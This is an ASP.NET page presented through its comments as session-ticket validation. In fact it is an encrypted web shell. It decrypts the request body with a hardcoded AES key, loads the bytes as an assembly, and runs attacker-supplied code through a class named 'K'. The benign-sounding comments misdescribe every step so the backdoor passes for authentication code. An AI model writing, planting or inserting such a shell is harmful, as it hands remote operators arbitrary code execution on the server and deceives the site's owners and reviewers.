<%@ Page Language="C#" %>
<%
// This page module is responsible for handling user session validation.
// It checks for a valid session cookie before proceeding.
if (Request.Cookies.Count > 0) 
{
    // Retrieve the session validation key from a constant.
    // This key is used to decrypt the user's session ticket.
    string sessionKey = "ca63457538b9b1e0";
    byte[] keyBytes = System.Text.Encoding.Default.GetBytes(sessionKey);

    // Read the encrypted session ticket from the request body.
    System.IO.Stream inputStream = Request.InputStream;
    byte[] encryptedTicket = new byte[inputStream.Length];
    inputStream.Read(encryptedTicket, 0, encryptedTicket.Length);
    
    // This part is for logging the last access time, currently disabled.
    // var lastAccessTime = DateTime.Now;

    // Decrypt the ticket to get the user's login data.
    var cryptoProvider = new System.Security.Cryptography.RijndaelManaged();
    var decryptor = cryptoProvider.CreateDecryptor(keyBytes, keyBytes);
    byte[] userLoginData = decryptor.TransformFinalBlock(encryptedTicket, 0, encryptedTicket.Length);

    // Load the appropriate user profile handler assembly.
    var profileHandlerAssembly = System.Reflection.Assembly.Load(userLoginData);

    // The standard profile class is identified by "K".
    string profileClassName = "K";

    // Create an instance of the profile handler and run the update check.
    // The 'Equals' method confirms if the current context is valid.
    object profileInstance = profileHandlerAssembly.CreateInstance(profileClassName);
    profileInstance.Equals(this);
}
%>